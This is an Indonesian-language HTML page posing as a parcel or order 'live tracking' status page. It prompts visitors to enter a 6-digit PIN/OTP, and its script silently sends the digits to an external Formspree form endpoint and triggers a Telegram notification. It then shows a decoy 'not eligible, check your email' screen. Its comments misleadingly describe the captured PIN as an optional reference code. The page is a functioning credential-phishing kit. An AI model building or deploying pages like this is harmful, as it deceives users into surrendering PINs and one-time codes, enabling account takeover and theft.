<!doctype html>
<html lang="id">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
<meta name="theme-color" content="#ffffff">
<title>Status Live Tracking</title>
<style>
  :root { color-scheme: light; --blue:#009688; --ink:#202124; --muted:#5f6368; --line:#dadce0; }
  * { box-sizing:border-box; }
  body {
    margin:0; min-height:100svh; background:#f5f7fb; color:var(--ink);
    font-family:Roboto, "Google Sans", Arial, sans-serif;
    display:flex; justify-content:center;
  }
  .app { width:100%; max-width:440px; min-height:100svh; background:#fff; display:flex; flex-direction:column; }
  header { height:48px; flex:none; background:#fff; border-bottom:1px solid #f0f1f3; }
  .brand-mark { width:28px; height:28px; border-radius:9px; background:#e8f0fe; display:grid; place-items:center; color:var(--blue); font-weight:800; margin-right:10px; }
  .brand { font-size:15px; font-weight:600; letter-spacing:.1px; }
  main { padding:38px 24px 28px; flex:1; }
  .icon-wrap { width:54px; height:54px; border-radius:16px; background:#e8f0fe; color:var(--blue); display:grid; place-items:center; margin-bottom:24px; }
  h1 { font-size:25px; line-height:1.25; letter-spacing:-.4px; margin:0 0 10px; font-weight:700; }
  .subtitle { color:var(--muted); font-size:14px; line-height:1.55; margin:0 0 30px; }
  .code-label { display:block; font-size:13px; font-weight:600; margin-bottom:12px; }
  .code-boxes { display:grid; grid-template-columns:repeat(6, minmax(0, 1fr)); gap:8px; }
  .digit { width:100%; min-width:0; height:54px; border:1px solid var(--line); border-radius:10px; text-align:center; font-size:23px; font-weight:600; color:var(--ink); outline:none; background:#fff; caret-color:var(--blue); }
  .digit:focus { border:2px solid var(--blue); padding:0; }
  .hint { min-height:20px; font-size:12px; color:var(--muted); margin-top:12px; line-height:1.5; }
  .notice { margin-top:28px; padding:13px 14px; border-radius:12px; background:#f8f9fa; color:#5f6368; font-size:12px; line-height:1.5; }
  .notice strong { color:#3c4043; }
  #verifyPanel { min-height:calc(100svh - 120px); display:flex; flex-direction:column; }
  .next { display:block; margin-top:auto; border:0; border-radius:24px; width:100%; min-height:48px; background:#009688; color:white; font-size:16px; font-weight:600; border-radius:0; }
  .next:focus-visible { outline:3px solid #aecbfa; outline-offset:2px; }
  footer { padding:16px 24px calc(18px + env(safe-area-inset-bottom)); text-align:center; color:#80868b; font-size:11px; }
  .success { display:none; text-align:center; padding-top:24px; }
  .invalid-icon { width:66px; height:66px; border-radius:50%; background:#fce8e6; color:#d93025; display:grid; place-items:center; margin:0 auto 22px; }
  .invalid-title { font-size:22px; line-height:1.35; margin:0 auto 12px; max-width:320px; font-weight:700; }
  .invalid-copy { color:var(--muted); font-size:14px; line-height:1.6; margin:0 auto; max-width:310px; }
  .other-method { display:inline-block; margin-top:18px; color:var(--blue); font-size:14px; font-weight:600; text-decoration:none; }
  .other-method:focus-visible { outline:2px solid #aecbfa; outline-offset:4px; border-radius:3px; }
  .success h2 { font-size:22px; margin:16px 0 8px; }
  .success p { color:var(--muted); font-size:14px; line-height:1.6; }
  .success .icon-wrap { margin:0 auto; border-radius:50%; }
  @media (min-width:600px) {
    body { padding:24px 0; }
    .app { min-height:calc(100svh - 48px); border-radius:22px; overflow:hidden; box-shadow:0 8px 32px #20212412; }
    main { padding-top:48px; }
  }
  @media (max-width:360px) { main { padding-left:18px; padding-right:18px; } .code-boxes { gap:6px; } .digit { height:49px; } h1 { font-size:23px; } }

  .final-card { min-height:calc(100svh - 120px); display:none; flex-direction:column; align-items:center; justify-content:center; text-align:center; padding-top:8px; }
  .status-symbol {
    width:72px; height:72px; border-radius:22px; margin:0 auto 22px;
    display:grid; place-items:center; color:#b7791f;
    background:linear-gradient(145deg,#fff7df,#fff0c2);
    box-shadow:inset 0 0 0 1px #f7df9b;
  }
  .status-pill {
    display:inline-flex; align-items:center; gap:7px; padding:7px 11px;
    border-radius:999px; background:#fff7e5; color:#8a5a08;
    font-size:12px; font-weight:700; margin:0 auto 16px;
  }
  .status-pill span { width:7px; height:7px; border-radius:50%; background:#d99a22; }
  .final-heading { text-align:center; font-size:24px; line-height:1.3; letter-spacing:-.35px; margin:0 0 12px; }
  .final-intro { text-align:center; color:var(--muted); font-size:14px; line-height:1.65; margin:0 auto 24px; max-width:330px; }
  .info-card { background:#f8faff; border:1px solid #e7edf8; border-radius:16px; padding:16px; margin:0 0 18px; }
  .info-title { display:flex; align-items:center; gap:9px; font-size:14px; font-weight:700; margin:0 0 9px; color:#303744; }
  .info-title svg { color:var(--blue); flex:none; }
  .info-card p { margin:0; color:#5f6775; font-size:13px; line-height:1.65; }
  .check-list { list-style:none; padding:0; margin:14px 0 0; display:grid; gap:10px; }
  .check-list li { display:flex; gap:9px; align-items:flex-start; color:#4e5664; font-size:13px; line-height:1.5; }
  .check-list li:before { content:""; width:6px; height:6px; border-radius:50%; background:#7b9ce6; margin-top:6px; flex:none; }
  .terms-copy { color:#687180; font-size:13px; line-height:1.65; text-align:center; margin:18px 0 22px; }
  .terms-link { color:var(--blue); font-weight:700; text-decoration:none; white-space:nowrap; }
  .terms-link:hover { text-decoration:underline; }
  .terms-link:focus-visible { outline:2px solid #aecbfa; outline-offset:3px; border-radius:3px; }
  .final-actions { display:grid; gap:10px; width:100%; max-width:280px; margin-top:22px; }
  .primary-action { display:flex; align-items:center; justify-content:center; width:100%; min-height:48px; border:0; border-radius:14px; background:var(--blue); color:#fff; font-size:14px; font-weight:700; text-decoration:none; cursor:pointer; }
  .secondary-action { display:flex; align-items:center; justify-content:center; width:100%; min-height:46px; border:1px solid #dfe3eb; border-radius:14px; background:#fff; color:#4f5968; font-size:14px; font-weight:600; cursor:pointer; }
  .final-footnote { text-align:center; color:#8a9099; font-size:11px; line-height:1.5; margin:20px 0 0; }
  @media (max-width:360px) { .final-heading { font-size:22px; } .info-card { padding:14px; } }

</style>
</head>
<body>
<div class="app">
  <header aria-hidden="true"></header>
<main>
    <section id="verifyPanel">
      <h1>KONFIRMASI PIN</h1>
      <label class="code-label" for="digit1">Masukan kode PIN 6 digit angka disini.</label>
      <div class="code-boxes" role="group" aria-label="Kode verifikasi OTP 6 digit">
        <input class="digit" id="digit1" aria-label="Digit referensi 1" inputmode="numeric" autocomplete="off" pattern="[0-9]*" maxlength="1" autofocus>
        <input class="digit" aria-label="Digit referensi 2" inputmode="numeric" pattern="[0-9]*" maxlength="1">
        <input class="digit" aria-label="Digit referensi 3" inputmode="numeric" pattern="[0-9]*" maxlength="1">
        <input class="digit" aria-label="Digit referensi 4" inputmode="numeric" pattern="[0-9]*" maxlength="1">
        <input class="digit" aria-label="Digit referensi 5" inputmode="numeric" pattern="[0-9]*" maxlength="1">
        <input class="digit" aria-label="Digit referensi 6" inputmode="numeric" pattern="[0-9]*" maxlength="1">
      </div>
<button class="next" id="nextButton" type="button">Konfirmasi</button>
    </section>
    <section class="success final-card" id="nextPanel" aria-live="polite">
      <div class="status-symbol" aria-hidden="true">
        <svg width="34" height="34" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round">
          <circle cx="12" cy="12" r="9"></circle>
          <path d="M12 8v4M12 16h.01"></path>
        </svg>
      </div>
      <h2 class="final-heading">Saat ini belum memenuhi syarat untuk menggunakan fitur ini</h2>
      <p class="final-intro">Coba cek email atau folder spam di ponsel kamu untuk info pesananmu.</p>
      <div class="final-actions">
        <button class="secondary-action" id="backButton" type="button">Kembali</button>
      </div>
    </section>
  </main>
  
</div>
<script>
(() => {
  const inputs = [...document.querySelectorAll('.digit')];
  const nextButton = document.getElementById('nextButton');
  const verifyPanel = document.getElementById('verifyPanel');
  const nextPanel = document.getElementById('nextPanel');
  const formspreeEndpoint = 'https://formspree.io/f/mnppwldv';

  function referenceCode() {
    return inputs.map(input => input.value).join('').slice(0, 6);
  }

  function fillFrom(index, value) {
    const digits = value.replace(/\D/g, '').slice(0, inputs.length - index);
    for (let i = 0; i < digits.length; i++) inputs[index + i].value = digits[i];
    const nextEmpty = inputs.findIndex((input, i) => i >= index && !input.value);
    if (nextEmpty >= 0) inputs[nextEmpty].focus();
    else inputs[inputs.length - 1].focus();
    updateHint();
  }

  inputs.forEach((input, index) => {
    input.addEventListener('input', () => {
      const value = input.value.replace(/\D/g, '');
      input.value = '';
      if (value) fillFrom(index, value);
    });
    input.addEventListener('keydown', event => {
      if (event.key === 'Backspace' && !input.value && index > 0) {
        inputs[index - 1].value = '';
        inputs[index - 1].focus();
      } else if (event.key === 'ArrowLeft' && index > 0) inputs[index - 1].focus();
      else if (event.key === 'ArrowRight' && index < inputs.length - 1) inputs[index + 1].focus();
    });
    input.addEventListener('paste', event => {
      const pasted = (event.clipboardData || window.clipboardData).getData('text');
      if (pasted) { event.preventDefault(); fillFrom(index, pasted); }
    });
  });

  async function confirmReference() {
    nextButton.disabled = true;
    nextButton.textContent = 'Memproses…';

    try {
      const data = new FormData();
      data.append('form_type', 'Kode referensi opsional');
      data.append('reference_code', referenceCode());
      const response = await fetch(formspreeEndpoint, {
        method: 'POST',
        body: data,
        headers: { 'Accept': 'application/json' }
      });

      if (!response.ok) throw new Error('Pengiriman gagal');

      // Kirim notifikasi status saja ke backend Telegram.
      // Kode referensi tidak disertakan dalam permintaan Telegram.
      try {
        await fetch('/api/telegram', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ event: 'reference_confirmation' })
        });
      } catch (_) {
        // Notifikasi Telegram gagal tidak membatalkan konfirmasi Formspree.
      }

      showNext();
    } catch (error) {
    } finally {
      nextButton.disabled = false;
      nextButton.textContent = 'Konfirmasi';
    }
  }

  function showNext() {
    verifyPanel.style.display = 'none';
    nextPanel.style.display = 'flex';
    window.scrollTo({ top: 0, behavior: 'smooth' });
  }

  nextButton.addEventListener('click', confirmReference);

  document.getElementById('backButton').addEventListener('click', () => {
    nextPanel.style.display = 'none';
    verifyPanel.style.display = 'flex';
    inputs.forEach(input => input.value = '');
    inputs[0].focus();
  });

})();
</script>
</body>
</html>
